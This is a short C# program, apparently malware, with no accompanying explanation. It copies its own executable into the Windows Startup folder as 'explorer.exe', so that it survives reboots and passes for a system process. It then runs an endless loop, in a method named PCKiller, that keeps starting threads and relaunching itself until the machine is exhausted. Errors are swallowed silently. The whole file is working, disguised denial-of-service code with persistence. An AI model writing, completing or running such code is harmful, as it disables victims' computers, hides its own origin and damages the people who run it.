using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.IO;
using System.Windows;
using System.Diagnostics;

namespace explorer
{
    class Program
    {

        static void Main(string[] args)
        {
            try
            {
                copyFile();
            }
            catch (Exception e)
            {

            }
            PCKiller();
        }

        static void PCKiller()
        {
            int i;
            i = 0;
            Thread pckiller = new Thread(new ThreadStart(PCKiller));
            string filePath = Directory.GetCurrentDirectory();
            string fileName = AppDomain.CurrentDomain.FriendlyName;
            string fileLocation = (filePath + (char)92 + fileName);
            while (true)
            {
                i++;
                pckiller.Start();
                Process.Start(fileLocation.ToString());
            }
        }

        static void copyFile()
        {
            string filePath = Directory.GetCurrentDirectory();
            string fileName = AppDomain.CurrentDomain.FriendlyName;
            string fileLocation = (filePath + (char)92 + fileName);
            string startupLocation = (Environment.GetEnvironmentVariable("USERPROFILE") + (char)92 + "AppData" + (char)92 + "Roaming" + (char)92 + "Microsoft" + (char)92 + "Windows" + (char)92 + "Start Menu" + (char)92 + "Programs" + (char)92 + "Startup" + (char)92 + "explorer.exe");
            File.Copy(fileLocation, startupLocation);
        }
    }
}
